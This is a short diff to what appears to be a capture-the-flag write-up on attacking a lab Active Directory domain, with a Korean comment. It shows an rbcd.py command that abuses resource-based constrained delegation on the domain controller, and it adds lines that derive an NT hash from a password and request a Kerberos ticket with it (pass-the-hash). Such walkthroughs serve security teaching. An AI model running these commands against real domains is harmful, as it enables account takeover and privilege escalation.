@@ -1342,7 +1342,10 @@ netexec ldap dc.phantom.vl -u wsilva -p 0xdf0xdf -M maq
 ```bash
 rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:0xdf0xdf -dc-ip 10.129.234.63
 
-getTGT.py phantom.vl/wsilva:0xdf0xdf
+echo -n 'Summer2026!' | iconv -t utf-16le | openssl md4 -provider legacy
+
+# NT Hash가 제공되면 impacket은 RC4만 요청.
+getTGT.py -hashes :41aed72cec76816423703d8e545eea31 phantom.vl/wsilva:0xdf0xdf
 
 describeTicket.py wsilva.ccache
 
